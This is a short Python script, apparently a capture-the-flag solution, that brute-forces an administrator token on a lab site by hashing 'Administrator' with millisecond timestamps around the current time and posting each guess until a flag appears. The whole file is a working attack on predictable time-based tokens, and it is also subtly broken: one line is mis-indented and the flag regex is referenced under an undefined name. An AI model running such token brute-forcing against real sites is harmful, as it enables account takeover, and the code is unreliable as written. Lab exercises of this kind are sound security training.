import threading
import requests
from hashlib import md5
import re
import time

url = "http://auth-attacks.ctf/question1/"
start_time = int(time.time()) * 1000
fail_text = "Wrong token"
user = "Administrator"

def check_token(x):
    token = user + str(x)
    md5_token = md5(token.encode()).hexdigest()
    raw_data = {
        "token": md5_token,
        "submit": "check"
    }
  print(f"[-] Checking:{md5_token}")
    res = requests.post(url, data=raw_data)
    if fail_text in res.text:
        pass
    else:
        Admin_string_regex = r"Admin\{[^}]*\}"
        Admin_strings = re.findall(htb_string_regex, res.text)
        if Admin_strings:
            print(Admin_strings[0])
        print(f"[*] Congratulations!, found the token:{md5_token}")
        exit()

pre_data = {"submit": "user2001"}
pre_res = requests.post(url, data=pre_data)
if "Your token is" in pre_res.text:
# In 2 seconds, 2000 timestamps in milliseconds will be created
    for x in range(start_time - 1250, start_time + 1250):
        check_token(x)
